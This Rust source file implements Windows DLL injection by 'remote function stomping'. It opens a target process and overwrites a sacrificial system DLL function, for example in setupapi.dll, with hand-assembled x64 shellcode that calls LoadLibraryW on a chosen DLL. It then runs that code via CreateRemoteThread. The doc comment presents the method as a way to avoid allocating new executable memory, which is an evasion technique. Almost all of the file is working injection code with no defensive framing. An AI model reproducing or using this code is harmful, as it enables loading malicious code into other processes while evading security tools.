use std::ffi::CString;
use std::path::Path;

use windows::core::PCSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VirtualProtectEx,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject, PROCESS_CREATE_THREAD,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};

use crate::error::MiscError;

/// Inject a DLL into a target process using remote function stomping.
///
/// Loads a sacrificial DLL locally to resolve a target function address (identical in the
/// remote process due to shared ASLR base), then overwrites that function's code in the
/// remote process with shellcode that calls `LoadLibraryW(dll_path)`. Execution via
/// `CreateRemoteThread` on the stomped address avoids allocating new executable memory.
///
/// # Arguments
/// * `pid` - Target process PID
/// * `dll_path` - Path to the DLL to inject
/// * `sacrificial_dll` - Name of the DLL containing the function to stomp (e.g. "setupapi.dll")
/// * `sacrificial_func` - Name of the function to overwrite (e.g. "SetupScanFileQueueA")
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process.
pub fn inject_dll_function_stomping(
    pid: u32,
    dll_path: &str,
    sacrificial_dll: &str,
    sacrificial_func: &str,
) -> Result<(), MiscError> {
    // Validate DLL exists
    if !Path::new(dll_path).exists() {
        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    // Encode DLL path as wide string (UTF-16) with null terminator
    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_path_bytes = wide_path.len() * std::mem::size_of::<u16>();

    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Load the sacrificial DLL in our own process to resolve the function address.
        // System DLLs share the same base address across processes (ASLR is per-boot),
        // so the address we get locally is valid in the remote process too.
        let sac_dll_cstr = CString::new(sacrificial_dll).unwrap();
        let sac_module =
            LoadLibraryA(PCSTR(sac_dll_cstr.as_ptr() as *const u8)).map_err(|_| {
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let sac_func_cstr = CString::new(sacrificial_func).unwrap();
        let sac_func_addr = GetProcAddress(
            sac_module,
            PCSTR(sac_func_cstr.as_ptr() as *const u8),
        );

        let sac_func_addr = match sac_func_addr {
            Some(addr) => addr as usize,
            None => {
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Resolve LoadLibraryW address for the shellcode
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let load_library_name = CString::new("LoadLibraryW").unwrap();
        let load_library_addr =
            GetProcAddress(kernel32, PCSTR(load_library_name.as_ptr() as *const u8));

        let load_library_addr = match load_library_addr {
            Some(addr) => addr as usize,
            None => {
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Build x64 shellcode that calls LoadLibraryW with the embedded DLL path.
        // Layout: [shellcode 28 bytes] [DLL path UTF-16]
        //
        //   sub rsp, 0x28               ; shadow space + alignment
        //   lea rcx, [rip + 0x11]       ; rcx = &dll_path (17 bytes ahead)
        //   mov rax, <LoadLibraryW>     ; absolute address
        //   call rax
        //   add rsp, 0x28
        //   ret
        //   <dll_path UTF-16 bytes>
        let mut payload: Vec<u8> = Vec::with_capacity(28 + wide_path_bytes);

        // sub rsp, 0x28
        payload.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
        // lea rcx, [rip + 0x11] — 17 bytes from end of this instruction to DLL path
        payload.extend_from_slice(&[0x48, 0x8D, 0x0D, 0x11, 0x00, 0x00, 0x00]);
        // mov rax, imm64 (LoadLibraryW address)
        payload.push(0x48);
        payload.push(0xB8);
        payload.extend_from_slice(&(load_library_addr as u64).to_le_bytes());
        // call rax
        payload.extend_from_slice(&[0xFF, 0xD0]);
        // add rsp, 0x28
        payload.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
        // ret
        payload.push(0xC3);
        // DLL path (UTF-16) appended right after shellcode
        let path_bytes: &[u8] =
            std::slice::from_raw_parts(wide_path.as_ptr() as *const u8, wide_path_bytes);
        payload.extend_from_slice(path_bytes);

        let total_size = payload.len();

        // Change protection of the sacrificial function region to writable
        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            process_handle,
            sac_func_addr as *const _,
            total_size,
            PAGE_READWRITE,
            &mut old_protection,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::WriteFailed
        })?;

        // Overwrite the sacrificial function with our shellcode + DLL path
        WriteProcessMemory(
            process_handle,
            sac_func_addr as *mut _,
            payload.as_ptr() as *const _,
            total_size,
            None,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::WriteFailed
        })?;

        // Restore execute permission so the stomped function can run
        VirtualProtectEx(
            process_handle,
            sac_func_addr as *const _,
            total_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::WriteFailed
        })?;

        // Execute the stomped function via CreateRemoteThread
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(sac_func_addr);

        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_start),
            None,
            0,
            None,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::CreateRemoteThreadFailed
        })?;

        // Wait for the remote thread to finish (10 second timeout)
        let wait_result = WaitForSingleObject(thread_handle, 10_000);

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        if wait_result.0 != 0 {
            return Err(MiscError::Timeout);
        }

        Ok(())
    }
}
